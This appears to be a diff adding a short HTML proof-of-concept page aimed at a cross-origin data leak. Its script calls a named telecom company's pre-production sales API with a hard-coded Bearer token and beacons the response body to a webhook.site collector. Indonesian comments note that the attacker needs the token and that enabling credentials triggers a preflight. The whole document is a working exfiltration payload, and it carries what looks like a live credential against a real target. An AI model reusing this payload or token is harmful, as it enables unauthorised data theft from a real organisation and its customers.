@@ -1,0 +1,31 @@
+<html>
+<body>
+<script>
+var xhttp = new XMLHttpRequest();
+
+xhttp.onreadystatechange = function () {
+    if (this.readyState === 4) {
+        var data = this.responseText ? this.responseText.substring(0, 500) : "NO_RESPONSE";
+        new Image().src =
+          "https://webhook.site/636caa55-17b4-482a-a690-ef04aff60385" +
+          "?status=" + this.status +
+          "&data=" + encodeURIComponent(data);
+    }
+};
+
+xhttp.open(
+  "GET",
+  "https://preprod.myenterprise.telkomsel.com/dev2/api/sales-plans/v2/opportunity/detail-multi-year?opportunityId=OP-7583",
+  true
+);
+
+// Authorization HARUS diketahui attacker (biasanya TIDAK)
+xhttp.setRequestHeader("Authorization", "Bearer yzz7DjiMv6km2AtJwfzbCBticWyogXMn6/HnlKv5Xz+Qz2v5hLPtKsmKmlGQCqNbIkeujr3o1vvwVTnHm3uGOBNGxHu/cThuM9Trdlu+BsBFYiVhSHI5yIZ7UYfJAI4EnClBCqBD9cIJvk6iMivkIj3MN+O8WgHDgTvVbGZR8ZrKSwnsfUehwSGTMKd+lXmUzCU3skfG7wKRDJRc45JZ6T5MB9tvxCnBlJ9HKEAHwyFYYlg02wGzNk6mVJ094slEYZxyxj9VLXocdqgcICs04OaF23ufdUWQk6WpJNEP3zm06MlqJyBSRysTs99i2GIwuI845attMylqIRsddDT6Rht0Qho3miru+GRM5nXY17vT1uu9AG7mdbNuh8H24gc07Z82SB+1Ja3r58vPLprpVyZw4a/h3ekG7hjdFkCQa9RaI9uv7MEY5OhbJ24occmJOUv8VJl4Eu3p1nE45XsZ1FbzcfLk8bsgBO4T4k6eurYumsDXDm33pIpZf8PieW/4qLuxZNf8oOLGPg2jcJ0IDSQ7MT2StpcEn4AFqCwouewD1egUmcqnBg7BFcm1kvsT4t94sz6keC7DeU2QVDBOeZdAGe23kKDiYBoc1VowOd5ZYDcFd9ywmmGrWJZ8DQKJq7jppzxuRb3cmCKp7msrZWvRnTRwR+ULNBauxQ0OkOBuRpyY7f85kKqn9IUzpx2pNxXzAbtKqe9wWHVnP8jRnqMgJFoTS1gHaVZNCBcG0JQsbmF6f3g9bp5qxsbyAlLCbMx6eyMO6YUGWJ9CSkqn1H1wYxUTVa4xhtg4VDJ0D+4bouDz+sMw6EB7Qy7QlRjOK/QuRW6mbRJjy8vuutTfmdDJfYJjEbdYMSLqbj6yp28c2s4kSC1hVgUZz2E0r4bhoWroZYuutOBQbzreH3a1dOIT4zXhG+rWvWNQa4Uk1/HHi6ZmQYXxW95AA9P15uPYmO+vp1G14dbfjXqsktoIi+3E8wdFKignSav7Huc9P9wggJWgOKxP59iKCpafuQYNCHKsajTp0sIbbMe/YX3dqY/o3U6wax+4IpAzquyfc+fsO8hR8dTjardXgW8l2BKh+PDEjasHkRBtp1Iyrbwozq3xDkRV/9u7xVR1PeMi7TzdUwhaY7nWDMhIfKZguEpr0UGOjwP1d/nu76//DlTOoKwIZLby4f37l9UliWhBnHZQJ+tZ0SGk0Fo12ueGhMzbhLSoVBukNlpfYa+y83U4qK/I5SQhFrgQB00JZHS9BQ7DHq2MQhHHTjgZY+SccrnfHGuWZuSZhI8Wy8vVPymsEUdf+WBz7bKH46Ir6w/oy3Cb66iRSm2xkQAH94tXkKqkMv8A3wgiRrEINiU2f6otPJPZyFCVAGr/9Jd/78f6jeiDoPLo6U8UXOy3aLF9G6pY6Bm29G9HGCA1s3scwSktMmhFi6YxoPTOpCboDvlnrr0vQuPxYyqSTBjSY9YqPn+hIOMTN4u3Vo5xiRcdVPsYEFG4aJ8tS+gN6hY/lWA5bKL0M/Xp49mcqg6zbSK8FsnIKV7oiEW2W8J34aOp2bqc37P/0/qt+ZYP4rpXPjCd66UZOfSZIjbqmfWIelm87+wXpXwbrdZ+/IlRQoGG3COf5VR9L0a8PPKxudHghlcBg/69Iuspyw4mwg==");
+
+// Akan trigger PREFLIGHT
+// xhttp.withCredentials = true;
+
+xhttp.send();
+</script>
+</body>
+</html>
